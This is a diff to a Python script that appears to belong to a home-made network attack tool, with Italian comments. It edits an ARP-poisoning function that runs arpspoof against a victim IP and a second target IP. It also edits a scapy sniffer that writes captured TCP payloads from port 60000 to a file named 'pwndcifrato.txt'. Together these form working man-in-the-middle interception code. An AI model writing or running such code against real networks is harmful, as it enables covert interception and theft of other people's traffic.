@@ -13,29 +13,25 @@ def arpoisoner(out_lck):
 
     victimip = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")
 
-    gatewayip = loop_input(out_lck, "Please insert gateway IP: ")
+    targetip = loop_input(out_lck, "Please insert target IP: ")
 
-    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % (intf, "192.168." + victimip, "192.168." + gatewayip))
+    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % (intf, "192.168." + victimip, "192.168." + targetip))
 
 #si so che è na porcata ma non mi viene in mente un modo migliore di farlo e si, non posso passare il file in prn
-file = open("received/pwndcifrato.txt", "wb")
 
-
-def out_sniff(packet):
-    file.write(bytes(packet[TCP].payload))
-
+def lel(file):
+    def out_sniff(packet):
+        file.write(bytes(packet[TCP].payload))
+    return out_sniff
 
 def analyzer(out_lck):
+    file = open("received/pwndcifrato.txt", "wb")
 
     output(out_lck, "Analizer")
 
-    protocol = loop_input(out_lck, "Please insert protocol: (Ex 'tcp' or 'udp')")
-
-    port = loop_int_input(out_lck, "Please insert port number: ")
-
     time = loop_int_input(out_lck, "Please insert a timeout for the sniffer (in second): ")
 
-    sniff(filter="%s and port %s" % (protocol, port), timeout=time, prn=out_sniff)
+    sniff(filter="tcp and port 60000", timeout=time, prn=lel(file))
 
     file.close()
 
